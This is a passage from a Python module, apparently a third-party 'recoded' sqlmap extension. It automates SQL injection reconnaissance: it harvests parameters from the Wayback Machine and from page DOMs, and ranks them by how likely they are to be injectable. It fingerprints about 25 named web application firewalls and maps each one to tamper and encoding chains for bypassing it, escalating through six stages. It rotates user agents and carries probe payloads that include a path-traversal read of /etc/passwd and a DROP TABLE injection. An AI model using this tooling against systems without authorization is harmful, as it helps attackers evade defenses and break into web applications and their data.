#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission

Recoded By Xbibz Official - AutoEngine Module v3.0
Fully automated SQL injection detection with:
  - ParamSpider-style parameter discovery (Wayback CDX + DOM mining)
  - DalFox-style WAF fingerprinting and bypass intelligence
  - Progressive tamper escalation with context-aware strategy
  - Smart connection error handling and retry logic
"""

from __future__ import print_function

import logging
import os
import re
import sys
import time
import json
import threading
try:
    from concurrent.futures import ThreadPoolExecutor, as_completed
    _HAS_CONCURRENT = True
except ImportError:
    _HAS_CONCURRENT = False

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import HEURISTIC_TEST
from lib.core.settings import RECODED_BY

# =============================================================================
# ParamSpider-Style: Parameter Discovery Configuration
# =============================================================================
# Inspired by ParamSpider (devanshbatham/ParamSpider)
# Uses Wayback Machine CDX API to discover historical URL parameters
# and DOM mining to extract additional attack surface

# Extensions to filter out (static resources, not useful for SQLi)
SPIDER_FILTER_EXTENSIONS = [
    ".jpg", ".jpeg", ".png", ".gif", ".svg", ".ico",
    ".css", ".js", ".woff", ".woff2", ".eot", ".ttf", ".otf",
    ".mp4", ".mp3", ".avi", ".mov", ".wmv", ".flv",
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
    ".webp", ".bmp", ".tiff", ".swf",
]

# GF-style parameter classification for SQLi prioritization
SQLI_PRIORITY_PARAMS = {
    "high": [
        "id", "uid", "pid", "cat", "category", "item", "page", "news_id",
        "post", "article", "user", "username", "login", "key", "token",
        "q", "search", "query", "keyword", "find", "filter",
        "sort", "order", "limit", "offset", "start", "begin",
        "record", "row", "num", "number", "count", "index",
        "file", "path", "dir", "folder", "document", "doc",
        "role", "group", "type", "status", "action", "cmd", "exec",
        "sql", "db", "database", "table", "select", "query",
    ],
    "medium": [
        "name", "title", "description", "comment", "message",
        "email", "mail", "phone", "mobile", "address",
        "date", "time", "year", "month", "day",
        "lang", "language", "locale", "region", "country",
        "tag", "label", "format", "view", "mode", "show",
        "ref", "referer", "redirect", "url", "link", "return",
        "callback", "jsonp", "api_key", "secret", "password",
    ],
    "low": [
        "style", "theme", "color", "size", "width", "height",
        "debug", "test", "demo", "sample", "example",
        "version", "ver", "v", "rev", "revision",
        "sid", "session", "sess", "csrf", "xsrf", "nonce",
    ],
}

# DOM mining patterns - extract parameter names from HTML/JS
DOM_PARAM_PATTERNS = [
    # JavaScript variable assignments that look like params
    re.compile(r"(?:var|let|const)\s+\w+\s*=\s*['\"]?(?:get|fetch|request)Param(?:eter)?\s*\(\s*['\"](\w+)['\"]", re.I),
    # URLSearchParams usage
    re.compile(r"URLSearchParams.*?get\s*\(\s*['\"](\w+)['\"]", re.I),
    # jQuery param access
    re.compile(r"\$\.(?:get|param)\s*\(\s*['\"](\w+)['\"]", re.I),
    # Form input names
    re.compile(r"<input[^>]+name\s*=\s*['\"]([^'\"]+)['\"]", re.I),
    # Anchor hrefs with parameters
    re.compile(r"href\s*=\s*['\"][^'\"]*\?(\w+)=", re.I),
    # AJAX data params
    re.compile(r"data\s*:\s*\{[^}]*(\w+)\s*:", re.I),
    # fetch/axios params
    re.compile(r"params\s*:\s*\{[^}]*(\w+)\s*:", re.I),
]

# =============================================================================
# DalFox-Style: WAF Fingerprint Database
# =============================================================================
# Inspired by DalFox (hahwul/dalfox)
# Multi-layer WAF detection: passive header fingerprinting,
# passive body fingerprinting, and provocation probe

WAF_FINGERPRINT_HEADERS = {
    # Cloud WAFs
    "Cloudflare": {
        "headers": ["cf-ray", "__cf_bm", "cf-cache-status", "cf-connecting-ip"],
        "body_patterns": ["cloudflare", "cf-browser-verification", "attention required", "ray id"],
        "confidence": 0.95,
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amzn-errortype", "aws-waf-token"],
        "body_patterns": ["awselb", "x-amzn-requestid", "request id"],
        "confidence": 0.90,
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "x-cache", "_abck", "akamai"],
        "body_patterns": ["akamai", "access denied", "reference #"],
        "confidence": 0.90,
    },
    "Imperva/Incapsula": {
        "headers": ["x-iinfo", "incap_ses", "visid_incap", "x-cdn", "x-iagg"],
        "body_patterns": ["incapsula", "incident id", "_Incapsula_Resource", "capsula"],
        "confidence": 0.93,
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "server: sucuri"],
        "body_patterns": ["sucuri", "cloudproxy", "firewall"],
        "confidence": 0.92,
    },
    "Azure WAF": {
        "headers": ["x-azure-ref", "x-azure-clientip", "x-msedge-ref"],
        "body_patterns": ["azure", "request id", "activity id"],
        "confidence": 0.88,
    },

    # Application Firewalls
    "ModSecurity": {
        "headers": ["server: mod_security", "server: modsecurity", "x-powered-by: mod_security"],
        "body_patterns": ["mod_security", "modsecurity", "not acceptable", "id \"941", "id \"942"],
        "confidence": 0.92,
    },
    "ModSecurity CRS": {
        "headers": [],
        "body_patterns": ["id \"941", "id \"942", "id \"943", "owasp csr", "core rule set"],
        "confidence": 0.90,
    },
    "NAXSI": {
        "headers": ["x-data-origin: naxsi"],
        "body_patterns": ["naxsi", "blocked by naxsi", "naxsi whitelist"],
        "confidence": 0.88,
    },
    "Wordfence": {
        "headers": ["x-wordfence"],
        "body_patterns": ["wordfence", "wfloggedout", "your access to this site has been limited"],
        "confidence": 0.91,
    },
    "Imunify360": {
        "headers": ["x-imunify360"],
        "body_patterns": ["imunify360", "imunify", "bot protection"],
        "confidence": 0.88,
    },
    "RSFirewall": {
        "headers": [],
        "body_patterns": ["rsfirewall", "com_rsfirewall"],
        "confidence": 0.85,
    },

    # Load Balancers / Proxies
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info", "bigip", "x-f5"],
        "body_patterns": ["bigip", "support id", "your request was intercepted", "f5 networks"],
        "confidence": 0.90,
    },
    "Barracuda": {
        "headers": ["x-barracuda", "barra"],
        "body_patterns": ["barracuda", "barracudanetworks"],
        "confidence": 0.88,
    },
    "Varnish": {
        "headers": ["x-varnish", "via: varnish"],
        "body_patterns": ["varnish", "cache server"],
        "confidence": 0.85,
    },
    "Bluecoat": {
        "headers": ["bluecoat"],
        "body_patterns": ["bluecoat", "denied by policy"],
        "confidence": 0.87,
    },
    "Citrix NetScaler": {
        "headers": ["x-citrix", "nsaff", "nsc_*"],
        "body_patterns": ["citrix", "netscaler", "access forbidden"],
        "confidence": 0.88,
    },

    # Chinese WAFs
    "Huawei Cloud WAF": {
        "headers": ["x-hw"],
        "body_patterns": ["huawei", "hwclouds", "waf.huawei"],
        "confidence": 0.87,
    },
    "Alibaba Cloud WAF": {
        "headers": ["x-acs", "x-ali"],
        "body_patterns": ["alibaba", "aliyun", "tianji"],
        "confidence": 0.87,
    },
    "Baidu YUNJIASU": {
        "headers": ["x-bd"],
        "body_patterns": ["baidu", "yunjiasu"],
        "confidence": 0.85,
    },
    "Safedog": {
        "headers": ["safedog"],
        "body_patterns": ["safedog", "safedog site"],
        "confidence": 0.88,
    },
    "Safeline": {
        "headers": ["safeline"],
        "body_patterns": ["safeline", "chaitin"],
        "confidence": 0.87,
    },

    # Other
    "DotDefender": {
        "headers": ["x-dotdefender"],
        "body_patterns": ["dotdefender"],
        "confidence": 0.90,
    },
    "Comodo": {
        "headers": ["comodo"],
        "body_patterns": ["comodo", "waf.comodo"],
        "confidence": 0.87,
    },
    "PHPIDS": {
        "headers": [],
        "body_patterns": ["phpids", "php-ids"],
        "confidence": 0.80,
    },
    "Juniper WebApp": {
        "headers": ["juniper"],
        "body_patterns": ["juniper", "webapp secure"],
        "confidence": 0.85,
    },
}

# =============================================================================
# DalFox-Style: WAF-to-Bypass Strategy Mapping
# =============================================================================
# Maps identified WAF to bypass strategies inspired by DalFox's approach
# Each strategy includes: tamper scripts, encoding, mutations, and delay hints

WAF_BYPASS_STRATEGIES = {
    # Cloud WAFs
    "Cloudflare": {
        "tampers": ["charencode", "randomcase", "space2comment", "between"],
        "encodings": ["url", "unicode", "2url"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation", "JsCommentSplit"],
        "delay_ms": 100,
    },
    "AWS WAF": {
        "tampers": ["space2comment", "randomcase", "charencode"],
        "encodings": ["2url", "3url", "unicode"],
        "mutations": ["WhitespaceMutation", "ConstructorChain"],
        "delay_ms": 0,
    },
    "Akamai": {
        "tampers": ["charencode", "randomcase", "space2plus", "percentage"],
        "encodings": ["3url", "4url", "unicode"],
        "mutations": ["HtmlCommentSplit", "ConstructorChain", "CaseAlternation"],
        "delay_ms": 50,
    },
    "Imperva/Incapsula": {
        "tampers": ["charencode", "randomcase", "space2comment", "between", "equaltolike"],
        "encodings": ["zwsp", "unicode", "2url"],
        "mutations": ["BacktickParens", "JsCommentSplit", "MixedHtmlEntities"],
        "delay_ms": 100,
    },
    "Sucuri": {
        "tampers": ["charencode", "randomcase", "space2comment"],
        "encodings": ["url", "unicode"],
        "mutations": ["CaseAlternation", "HtmlCommentSplit"],
        "delay_ms": 50,
    },
    "Azure WAF": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation"],
        "delay_ms": 50,
    },

    # Application Firewalls
    "ModSecurity": {
        "tampers": ["modsecurityversioned", "modsecurityzeroversioned", "charencode", "randomcase", "space2comment"],
        "encodings": ["4url", "2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "WhitespaceMutation", "CaseAlternation", "BacktickParens"],
        "delay_ms": 0,
    },
    "ModSecurity CRS": {
        "tampers": ["modsecurityversioned", "modsecurityzeroversioned", "charencode", "randomcase"],
        "encodings": ["unicode", "4url", "2url", "htmlpad"],
        "mutations": ["SlashSeparator", "SvgAnimateExec", "HtmlEntityParens", "ExoticWhitespace"],
        "delay_ms": 0,
    },
    "NAXSI": {
        "tampers": ["charencode", "randomcase", "space2comment", "base64encode"],
        "encodings": ["url", "unicode", "2url"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation"],
        "delay_ms": 0,
    },
    "Wordfence": {
        "tampers": ["charencode", "randomcase", "space2comment", "between"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation", "WhitespaceMutation"],
        "delay_ms": 0,
    },
    "Imunify360": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "WhitespaceMutation"],
        "delay_ms": 50,
    },

    # Load Balancers / Proxies
    "F5 BIG-IP ASM": {
        "tampers": ["charencode", "randomcase", "space2comment", "between", "modsecurityversioned"],
        "encodings": ["url", "unicode", "2url"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation"],
        "delay_ms": 50,
    },
    "Barracuda": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "WhitespaceMutation"],
        "delay_ms": 50,
    },
    "Varnish": {
        "tampers": ["varnish", "charencode", "randomcase"],
        "encodings": ["url", "2url"],
        "mutations": ["CaseAlternation"],
        "delay_ms": 0,
    },
    "Bluecoat": {
        "tampers": ["bluecoat", "charencode", "randomcase", "space2comment"],
        "encodings": ["url", "2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation"],
        "delay_ms": 50,
    },
    "Citrix NetScaler": {
        "tampers": ["charencode", "randomcase", "space2comment", "between"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation", "WhitespaceMutation"],
        "delay_ms": 50,
    },

    # Chinese WAFs
    "Huawei Cloud WAF": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage", "base64encode"],
        "encodings": ["2url", "unicode", "3url"],
        "mutations": ["HtmlCommentSplit", "WhitespaceMutation"],
        "delay_ms": 100,
    },
    "Alibaba Cloud WAF": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage"],
        "encodings": ["2url", "unicode", "3url"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation"],
        "delay_ms": 50,
    },
    "Safedog": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "CaseAlternation"],
        "delay_ms": 50,
    },
    "Safeline": {
        "tampers": ["charencode", "randomcase", "space2comment", "percentage", "between"],
        "encodings": ["2url", "unicode"],
        "mutations": ["HtmlCommentSplit", "WhitespaceMutation"],
        "delay_ms": 50,
    },

    # Other
    "DotDefender": {
        "tampers": ["charencode", "randomcase", "space2comment", "between"],
        "encodings": ["url", "2url"],
        "mutations": ["CaseAlternation", "HtmlCommentSplit"],
        "delay_ms": 0,
    },
    "PHPIDS": {
        "tampers": ["charencode", "randomcase", "space2comment", "between"],
        "encodings": ["url", "unicode"],
        "mutations": ["CaseAlternation", "HtmlCommentSplit"],
        "delay_ms": 0,
    },
}

# Default strategy when WAF is detected but not specifically identified
GENERIC_WAF_STRATEGY = {
    "tampers": ["charencode", "randomcase", "space2comment", "between"],
    "encodings": ["url", "2url"],
    "mutations": ["HtmlCommentSplit", "CaseAlternation"],
    "delay_ms": 50,
}

# Progressive escalation tamper chains (6 stages)
ESCALATION_STAGES = [
    # Stage 1: Subtle encoding
    ["charencode"],
    # Stage 2: Case randomization + encoding
    ["charencode", "randomcase"],
    # Stage 3: Space replacement + encoding
    ["charencode", "randomcase", "space2comment"],
    # Stage 4: Full chain with keyword substitution
    ["charencode", "randomcase", "space2comment", "between", "equaltolike"],
    # Stage 5: Aggressive - double encoding + all tricks
    ["charencode", "chardoubleencode", "randomcase", "space2comment", "between", "percentage"],
    # Stage 6: Maximum bypass
    ["charencode", "chardoubleencode", "randomcase", "space2comment", "between", "equaltolike", "percentage", "randomcomments"],
]

# DalFox-style provocation probe payload for WAF detection
WAF_PROBE_PAYLOADS = [
    "1' OR '1'='1",
    "1 UNION SELECT NULL--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "1; DROP TABLE users--",
]

# DalFox-style WAF blocking status codes
WAF_BLOCK_STATUS_CODES = [403, 406, 419, 429, 500, 501, 503]

# =============================================================================
# Performance Engine v3.1: Turbo Mode
# =============================================================================
# Multi-layered performance optimizations:
#   - WAF fingerprint result caching (avoids redundant re-detection)
#   - Concurrent spider fetching (Wayback CDX + DOM mining in parallel)
#   - Parallel WAF provocation probes
#   - Adaptive concurrency control (auto-tunes threads/delay from response metrics)
#   - Real-time performance metrics tracking

# WAF fingerprint cache: stores (result, timestamp) pairs
_wafCache = {}
_wafCacheLock = threading.Lock()
_WAF_CACHE_TTL = 300  # 5 minutes

# Performance metrics accumulator
_perfMetrics = {
    "totalRequests": 0,
    "totalErrors": 0,
    "totalLatencyMs": 0,
    "rateLimitHits": 0,
    "wafBlocks": 0,
    "startTime": None,
    "lastResponseTime": None,
    "consecutiveErrors": 0,
    "consecutiveSuccesses": 0,
}
_perfMetricsLock = threading.Lock()

# Adaptive controller state
_adaptiveState = {
    "currentThreads": 3,
    "currentDelay": 0,
    "lastAdjustTime": 0,
    "adjustCooldown": 10,  # seconds between adjustments
}


def _getCachedWafResult(cacheKey):
    """Get cached WAF fingerprint result if still valid."""
    with _wafCacheLock:
        if cacheKey in _wafCache:
            result, timestamp = _wafCache[cacheKey]
            if time.time() - timestamp < _WAF_CACHE_TTL:
                return result
            del _wafCache[cacheKey]
    return None


def _setCachedWafResult(cacheKey, result):
    """Cache WAF fingerprint result with TTL."""
    with _wafCacheLock:
        _wafCache[cacheKey] = (result, time.time())


def _recordResponse(latencyMs, isError=False, isRateLimit=False, isWafBlock=False):
    """Record a response for adaptive performance tracking."""
    with _perfMetricsLock:
        _perfMetrics["totalRequests"] += 1
        _perfMetrics["totalLatencyMs"] += latencyMs
        _perfMetrics["lastResponseTime"] = time.time()
        if isError:
            _perfMetrics["totalErrors"] += 1
            _perfMetrics["consecutiveErrors"] += 1
            _perfMetrics["consecutiveSuccesses"] = 0
        else:
            _perfMetrics["consecutiveErrors"] = 0
            _perfMetrics["consecutiveSuccesses"] += 1
        if isRateLimit:
            _perfMetrics["rateLimitHits"] += 1
        if isWafBlock:
            _perfMetrics["wafBlocks"] += 1


def autoAdaptiveTune():
    """
    Adaptive concurrency and delay tuning based on response metrics.
    Inspired by TCP congestion control: additive increase, multiplicative decrease.
    - If consecutive successes: gradually increase threads, decrease delay
    - If rate-limit/WAF blocks: reduce threads, increase delay
    - If high error rate: back off aggressively
    """
    if not conf.get("autoMode"):
        return

    now = time.time()
    if now - _adaptiveState.get("lastAdjustTime", 0) < _adaptiveState.get("adjustCooldown", 10):
        return

    with _perfMetricsLock:
        metrics = dict(_perfMetrics)
        consecutive_errors = metrics.get("consecutiveErrors", 0)
        consecutive_successes = metrics.get("consecutiveSuccesses", 0)
        rate_limit_hits = metrics.get("rateLimitHits", 0)
        waf_blocks = metrics.get("wafBlocks", 0)
        total = metrics.get("totalRequests", 0)
        errors = metrics.get("totalErrors", 0)

    _adaptiveState["lastAdjustTime"] = now

    current_threads = conf.threads or 3
    current_delay = conf.delay or 0

    # Aggressive backoff on rate limits or WAF blocks
    if rate_limit_hits > 0 or waf_blocks > 0:
        # Multiplicative decrease (like TCP AIMD)
        new_threads = max(1, current_threads // 2)
        new_delay = min(current_delay * 2 + 1, 10)

        if new_threads != current_threads or new_delay != current_delay:
            conf.threads = new_threads
            conf.delay = new_delay
            infoMsg = "[AUTO-TUNE] WAF/rate-limit detected - threads=%d, delay=%.1fs" % (new_threads, new_delay)
            logger.info(infoMsg)
            dataToStdout("\033[01;33m[AUTO-TUNE]\033[0m WAF pressure - throttling: threads=%d, delay=%.1fs\n" % (new_threads, new_delay))
            # Reset counters after adjustment
            with _perfMetricsLock:
                _perfMetrics["rateLimitHits"] = 0
                _perfMetrics["wafBlocks"] = 0
        return

    # Error rate backoff
    if total > 10 and errors / total > 0.3:
        new_threads = max(1, current_threads - 1)
        new_delay = min(current_delay + 0.5, 5)
        if new_threads != current_threads or new_delay != current_delay:
            conf.threads = new_threads
            conf.delay = new_delay
            infoMsg = "[AUTO-TUNE] High error rate (%.0f%%) - threads=%d, delay=%.1fs" % (errors * 100 / total, new_threads, new_delay)
            logger.info(infoMsg)
        return

    # Additive increase on sustained success (slow start recovery)
    if consecutive_successes >= 20:
        max_threads = min(10, _adaptiveState.get("currentThreads", 3) + 2)
        new_threads = min(current_threads + 1, max_threads)
        new_delay = max(current_delay - 0.1, 0)

        if conf.threads != new_threads or conf.delay != new_delay:
            conf.threads = new_threads
            if new_delay > 0:
                conf.delay = new_delay
            infoMsg = "[AUTO-TUNE] Stable responses - increasing throughput: threads=%d, delay=%.1fs" % (new_threads, new_delay)
            logger.info(infoMsg)
            dataToStdout("\033[01;32m[AUTO-TUNE]\033[0m Speeding up: threads=%d, delay=%.1fs\n" % (new_threads, new_delay))
            with _perfMetricsLock:
                _perfMetrics["consecutiveSuccesses"] = 0

# =============================================================================
# ParamSpider-Style: Wayback CDX API Integration
# =============================================================================

WAYBACK_CDX_API = "https://web.archive.org/cdx/search/cdx"

# Random User-Agent pool for spider requests
USER_AGENT_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]


def _fetchWaybackUrls(domain, includeSubs=True):
    """
    ParamSpider-style: Fetch URLs with parameters from Wayback Machine CDX API.
    This is passive reconnaissance - never touches the target host directly.
    Returns a list of unique URLs that have query parameters.
    """
    try:
        import urllib.request
        import urllib.parse
        import random
    except ImportError:
        return []

    urls = set()
    placeholder = "FUZZ"

    try:
        # Build CDX API URL
        wildcard = "*." if includeSubs else ""
        cdx_url = "%s?url=%s%s/*&output=txt&collapse=urlkey&fl=original&page=/" % (
            WAYBACK_CDX_API, wildcard, urllib.parse.quote(domain, safe="")
        )

        infoMsg = "[SPIDER] Querying Wayback CDX API for domain: %s" % domain
        logger.info(infoMsg)
        dataToStdout("\033[01;35m[SPIDER]\033[0m Querying Wayback Machine for historical URLs...\n")

        # Fetch with random User-Agent
        request = urllib.request.Request(cdx_url)
        request.add_header("User-Agent", random.choice(USER_AGENT_POOL))

        try:
            response = urllib.request.urlopen(request, timeout=30)
            raw_text = response.read().decode("utf-8", errors="ignore")
        except Exception as ex:
            warnMsg = "[SPIDER] Wayback CDX API request failed: %s" % str(ex)
            logger.warning(warnMsg)
            return []

        # Parse raw URLs
        raw_urls = raw_text.strip().split() if raw_text.strip() else []

        infoMsg = "[SPIDER] Retrieved %d raw URLs from Wayback Machine" % len(raw_urls)
        logger.info(infoMsg)
        dataToStdout("\033[01;35m[SPIDER]\033[0m Retrieved %d raw URLs from Wayback\n" % len(raw_urls))

        # Clean and process URLs (ParamSpider-style)
        for url in raw_urls:
            try:
                cleaned = _cleanSpiderUrl(url, placeholder)
                if cleaned and "?" in cleaned:
                    urls.add(cleaned)
            except Exception:
                continue

        infoMsg = "[SPIDER] Found %d unique URLs with parameters" % len(urls)
        logger.info(infoMsg)
        dataToStdout("\033[01;35m[SPIDER]\033[0m Found %d unique parameterized URLs\n" % len(urls))

    except Exception as ex:
        warnMsg = "[SPIDER] Wayback CDX query failed: %s" % str(ex)
        logger.warning(warnMsg)

    return list(urls)


def _cleanSpiderUrl(url, placeholder="FUZZ"):
    """
    ParamSpider-style URL cleaning:
    1. Remove redundant ports (:80 for HTTP, :443 for HTTPS)
    2. Filter out static file extensions
    3. Replace parameter values with placeholder
    4. Deduplicate
    """
    try:
        import urllib.parse
    except ImportError:
        return None

    try:
        parsed = urllib.parse.urlparse(url)

        # Remove redundant ports
        netloc = parsed.netloc
        if parsed.scheme == "http" and netloc.endswith(":80"):
            netloc = netloc.rsplit(":", 1)[0]
        elif parsed.scheme == "https" and netloc.endswith(":443"):
            netloc = netloc.rsplit(":", 1)[0]

        # Filter out boring extensions
        path_lower = parsed.path.lower()
        for ext in SPIDER_FILTER_EXTENSIONS:
            if path_lower.endswith(ext):
                return None

        # Replace parameter values with placeholder
        if parsed.query:
            query_params = urllib.parse.parse_qs(parsed.query)
            cleaned_params = {}
            for key in query_params:
                cleaned_params[key] = placeholder
            cleaned_query = urllib.parse.urlencode(cleaned_params, doseq=True)
        else:
            cleaned_query = ""

        # Rebuild URL
        result = urllib.parse.urlunparse((
            parsed.scheme, netloc, parsed.path,
            parsed.params, cleaned_query, ""
        ))

        return result

    except Exception:
        return None


def _mineDomParams(pageContent):
    """
    DalFox-style DOM parameter mining:
    Extract parameter names from HTML/JavaScript source code.
    Discovers hidden parameters not visible in URL.
    """
    found_params = set()

    if not pageContent:
        return found_params

    for pattern in DOM_PARAM_PATTERNS:
        try:
            matches = pattern.findall(pageContent)
            found_params.update(matches)
        except Exception:
            continue

    return found_params


def _classifyParamPriority(paramName):
    """
    Classify a parameter's SQLi testing priority based on its name.
    Returns: 'high', 'medium', 'low'
    """
    param_lower = paramName.lower().strip()

    for priority, params in SQLI_PRIORITY_PARAMS.items():
        if param_lower in params:
            return priority

    # Partial match (param name contains priority keyword)
    # Only match keywords >= 4 chars to avoid false matches
    # (e.g., "dir" matching "redirect", "sql" matching "session")
    for priority in ("high", "medium"):
        for p in SQLI_PRIORITY_PARAMS[priority]:
            if len(p) >= 4 and p in param_lower:
                return priority

    return "low"


def _sortParamsBySqliPriority(url_list):
    """
    Sort discovered URLs by SQLi priority.
    URLs with high-priority parameters come first.
    """
    def get_priority_score(url):
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            max_score = 0
            for param in params:
                priority = _classifyParamPriority(param)
                if priority == "high":
                    max_score = max(max_score, 3)
                elif priority == "medium":
                    max_score = max(max_score, 2)
                elif priority == "low":
                    max_score = max(max_score, 1)
            return -max_score  # Negative for descending sort
        except Exception:
            return 0

    return sorted(url_list, key=get_priority_score)


def _extractDomain(url):
    """Extract domain from URL for Wayback CDX query."""
    try:
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc
        # Remove port
        if ":" in domain:
            domain = domain.split(":")[0]
        # Remove www prefix for better results
        if domain.startswith("www."):
            domain = domain[4:]
        return domain if domain else None
    except Exception:
        return None


def spiderTarget(url, includeSubs=True):
    """
    ParamSpider-style: Discover URL parameters for the target domain.
    Combines Wayback CDX API with DOM mining for maximum coverage.
    Now with concurrent execution: Wayback + DOM mining run in parallel.

    Returns: list of URLs with parameters, sorted by SQLi priority
    """
    domain = _extractDomain(url)

    if not domain:
        warnMsg = "[SPIDER] Could not extract domain from URL: %s" % url
        logger.warning(warnMsg)
        return []

    _perfMetrics["startTime"] = _perfMetrics.get("startTime") or time.time()

    dataToStdout("\n\033[01;35m[SPIDER]\033[0m \033[01;37mParameter Discovery Mode - Recoded By Xbibz Official (Turbo)\033[0m\n")
    dataToStdout("\033[01;35m[SPIDER]\033[0m Target domain: %s\n" % domain)

    all_urls = []
    wayback_urls = []
    dom_params = set()

    def _doWaybackFetch():
        return _fetchWaybackUrls(domain, includeSubs)

    def _doDomMining():
        params = set()
        try:
            from lib.request.connect import Connect as Request
            page, _, _ = Request.queryPage(content=True, ignoreSecondOrder=True)
            if page:
                params = _mineDomParams(page)
        except Exception:
            pass
        return params

    # Run Wayback CDX + DOM mining concurrently
    if _HAS_CONCURRENT:
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;36mConcurrent mode: Wayback + DOM mining in parallel\033[0m\n")
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=2) as executor:
            wayback_future = executor.submit(_doWaybackFetch)
            dom_future = executor.submit(_doDomMining)

            wayback_urls = wayback_future.result()
            dom_params = dom_future.result()
        elapsed = time.time() - start_time
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;36mConcurrent fetch completed in %.1fs\033[0m\n" % elapsed)
    else:
        # Fallback: sequential execution
        wayback_urls = _doWaybackFetch()
        dom_params = _doDomMining()

    # Merge Wayback results
    if wayback_urls:
        all_urls.extend(wayback_urls)
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;32mWayback: %d URLs discovered\033[0m\n" % len(wayback_urls))

    # Merge DOM mining results
    if dom_params:
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;32mDOM mining: %d additional params found\033[0m\n" % len(dom_params))
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            base_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, "", ""
            ))
            for param in dom_params:
                new_url = "%s?%s=FUZZ" % (base_url, param)
                if new_url not in all_urls:
                    all_urls.append(new_url)
        except Exception:
            pass

    # Sort by SQLi priority
    sorted_urls = _sortParamsBySqliPriority(all_urls)

    if sorted_urls:
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;32mTotal: %d parameterized URLs ready for testing\033[0m\n\n" % len(sorted_urls))

        high_count = 0
        medium_count = 0
        low_count = 0
        for u in sorted_urls:
            try:
                import urllib.parse
                params = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
                for p in params:
                    pr = _classifyParamPriority(p)
                    if pr == "high":
                        high_count += 1
                    elif pr == "medium":
                        medium_count += 1
                    else:
                        low_count += 1
            except Exception:
                pass

        dataToStdout("\033[01;35m[SPIDER]\033[0m Priority: \033[01;31m%d high\033[0m, \033[01;33m%d medium\033[0m, \033[01;34m%d low\033[0m\n\n" % (high_count, medium_count, low_count))
    else:
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;33mNo parameterized URLs found via spidering\033[0m\n\n")

    return sorted_urls


# =============================================================================
# DalFox-Style: WAF Fingerprinting Engine
# =============================================================================

def fingerprintWaf(responseHeaders=None, responseBody=None, statusCode=None):
    """
    DalFox-style multi-layer WAF fingerprinting:
    Layer 1: Passive header fingerprinting (zero extra requests)
    Layer 2: Passive body fingerprinting (zero extra requests)
    Layer 3: Status code boost (block pages use specific status codes)

    Now with TTL-based result caching to avoid redundant fingerprinting.
    Returns: dict with detected WAF names and confidence scores
    """
    # Check cache first
    cacheKey = None
    try:
        cacheParts = []
        if responseHeaders:
            if hasattr(responseHeaders, 'headers'):
                cacheParts.append(str(sorted(responseHeaders.headers)))
            elif isinstance(responseHeaders, dict):
                cacheParts.append(str(sorted(responseHeaders.items())))
        cacheParts.append(str(statusCode))
        cacheParts.append((responseBody or "")[:200])
        cacheKey = "|".join(cacheParts)
        cached = _getCachedWafResult(cacheKey)
        if cached is not None:
            return cached
    except Exception:
        pass

    detected_wafs = {}

    if not responseHeaders and not responseBody:
        return detected_wafs

    # Prepare header dict for matching
    header_str = ""
    header_dict = {}
